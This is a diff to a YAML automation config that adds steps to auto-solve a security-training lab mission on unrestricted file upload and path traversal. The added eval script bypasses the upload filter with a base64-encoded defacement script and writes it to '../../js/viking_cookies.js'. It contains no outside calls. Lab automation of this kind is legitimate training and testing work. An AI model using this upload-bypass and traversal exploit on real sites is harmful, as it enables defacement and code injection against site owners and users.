@@ -817,3 +817,52 @@ steps:
     do:
       - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#log-evidence-input', value: '{evidence}' }
       - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#block-user-btn-submit', settle: 4 }
+
+  # --- Unrestricted file upload / path traversal defacement mission (vb-66) --------
+  # "web.fileupload.unrestricted": the profile-picture upload does NO validation, so you can
+  # upload any file type AND (because the backend joins the raw user-supplied filename onto the
+  # upload dir) traverse out of it. Overwrite the login page's /js/viking_cookies.js with a
+  # defacement script. 6 instructions (order 0-5); order 3 "Investigate the code" is
+  # informational (no checkbox → skipped). Covered by EXISTING handlers: order 1 "Log in as
+  # Alice" (login-as), order 2 "Visit your profile" (navigate-endpoint, desc names /`profile`),
+  # order 5 "Log out and see the result" (log-out — its title starts "Log out"). The two below
+  # are the new ones. Solved + validated LIVE end-to-end 2026-07-13 (login page defaced to
+  # "Viking Bank got pwned!"; mission complete).
+
+  # order 0 "Check the cookie script": dismiss the cookie modal by accepting. The Accept button
+  # (#accept-cookies) is in the app login page [0,0,0]; a DOM-level click covers the case where
+  # an ad-blocker hides it (the framework's js_click fallback).
+  - id: accept-cookies
+    match:
+      title_regex: '(?i)^check the cookie script'
+    do:
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#accept-cookies', settle: 2 }
+
+  # order 4 "Override the script on the login page": the exploit. The upload form (#image-file
+  # type=file, #image-name text, #upload-profile-pic-btn-submit) has no restrictions. An `eval`
+  # injects a JS File (the defacement script, matching the mission's viking_cookies.js snippet —
+  # hardcoded base64 below since it's fixed training data and the code pane soft-wraps two long
+  # style-string lines) onto the file input via DataTransfer (bypassing the .jpg accept filter —
+  # the unrestricted-upload vuln), then sets #image-name to the TRAVERSAL path
+  # `../../js/viking_cookies.js` so the backend writes it into wwwroot/js/ instead of
+  # wwwroot/uploads/profilepictures/. Then click Upload. React-controlled name field → native
+  # setter. NOTE: if SCW ever changes the expected snippet, re-capture the viking_cookies.js tab
+  # in the mission code pane [0,0] and re-encode; the base64 decodes to the window.onload
+  # defacement that blanks the body and writes "Viking Bank got pwned!".
+  - id: override-login-script
+    match:
+      title_regex: '(?i)^override the script on the login page'
+    do:
+      - eval:
+          frame: "0/0/0"
+          script: >-
+            var content=atob('d2luZG93Lm9ubG9hZCA9IChldmVudCkgPT4gewogICAgZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAiIjsKCiAgICBkb2N1bWVudC5ib2R5ID0gYXBwbHlTdHlsZUF0dHJpYnV0ZSgiYmFja2dyb3VuZC1jb2xvcjojMDAwMDAwIiwgZG9jdW1lbnQuYm9keSkKCiAgICBjb25zdCBoMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImgxIik7CiAgICBjb25zdCBub2RlID0gZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUoIlZpa2luZyBCYW5rIGdvdCBwd25lZCEiKTsKICAgIGgxLmFwcGVuZENoaWxkKG5vZGUpOwoKICAgIGNvbnN0IHBhcmEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJwIikKICAgIGNvbnN0IHRleHQgPSBkb2N1bWVudC5jcmVhdGVUZXh0Tm9kZSgiPiBObyBtb3JlIGNvb2tpZXMgaW4gdGhlIGNvb2tpZSBqYXIhIDspIikKICAgIHBhcmEuYXBwZW5kQ2hpbGQodGV4dCkKCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGFwcGx5U3R5bGVBdHRyaWJ1dGUoImNvbG9yOiAjMDBGRjAwOztmb250LWZhbWlseTogbW9ub3NwYWNlO21hcmdpbjphdXRvO3dpZHRoOjUwJTttYXJnaW4tdG9wOiAyNSU7IiwgaDEpKTsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYXBwbHlTdHlsZUF0dHJpYnV0ZSgiY29sb3I6ICMwMEZGMDA7O2ZvbnQtZmFtaWx5OiBtb25vc3BhY2U7bWFyZ2luOmF1dG87d2lkdGg6NTAlOyIsIHBhcmEpKTsKCn07CgoKY29uc3QgYXBwbHlTdHlsZUF0dHJpYnV0ZSA9IChzdHlsZSwgaHRtbGVsZW0pID0+IHsKICAgIGNvbnN0IGF0dHJpYnV0ZSA9IGRvY3VtZW50LmNyZWF0ZUF0dHJpYnV0ZSgic3R5bGUiKQogICAgYXR0cmlidXRlLnZhbHVlID0gc3R5bGUKICAgIGh0bWxlbGVtLnNldEF0dHJpYnV0ZU5vZGUoYXR0cmlidXRlKQogICAgcmV0dXJuIGh0bWxlbGVtCn0K');
+            var inp=document.querySelector('#image-file');
+            var f=new File([content],'viking_cookies.js',{type:'text/javascript'});
+            var dt=new DataTransfer(); dt.items.add(f); inp.files=dt.files;
+            inp.dispatchEvent(new Event('change',{bubbles:true}));
+            var nm=document.querySelector('#image-name');
+            var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;
+            s.call(nm,'../../js/viking_cookies.js');
+            nm.dispatchEvent(new Event('input',{bubbles:true}));
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#upload-profile-pic-btn-submit', settle: 4 }
